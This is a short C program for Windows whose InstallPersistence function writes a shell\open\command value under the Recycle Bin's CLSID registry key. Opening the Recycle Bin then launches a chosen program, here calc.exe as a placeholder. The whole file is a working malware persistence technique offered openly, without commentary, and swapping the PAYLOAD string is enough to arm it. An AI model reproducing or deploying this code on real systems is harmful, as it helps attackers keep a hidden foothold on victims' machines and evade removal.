#include <Windows.h>
#include <stdio.h>

#define FAILURE -1
#define SUCCESS 0


#define REGKEY1 "SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell"
#define REGKEY2	"open\\command"
#define PAYLOAD "calc.exe"


int InstallPersistence() {
	HKEY  hKResult, hKey;
	DWORD lpdwDesposition;

	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGKEY1, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
		printf("[!] RegOpenKeyExA Failed With Error : %d \n", GetLastError());
		printf("[+] hKey: 0x%x \n", hKey);
		return FAILURE;
	}
	else {
		printf("[+] Success ! \n");
	}


	if (RegCreateKeyExA(hKey, REGKEY2, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKResult, &lpdwDesposition) != ERROR_SUCCESS) {
		printf("[!] RegCreateKeyExA Failed With Error : %d \n", GetLastError());
		printf("[+] hKResult: 0x%x \n", hKResult);
		return FAILURE;
	}
	else {
		printf("[+] Success ! \n");
	}


	if (RegSetValueExA(hKResult, NULL, 0, REG_SZ, PAYLOAD, sizeof(PAYLOAD)) != ERROR_SUCCESS) {
		printf("[!] RegSetValueExA Failed With Error : %d \n", GetLastError());
		return FAILURE;
	}
	else {
		printf("[+] Success ! \n");
	}

	RegCloseKey(hKey);
	RegCloseKey(hKResult);
	
	return SUCCESS;
}



int main() {
	if (InstallPersistence() != SUCCESS) {
		return -1;
	}
	return 0;
}
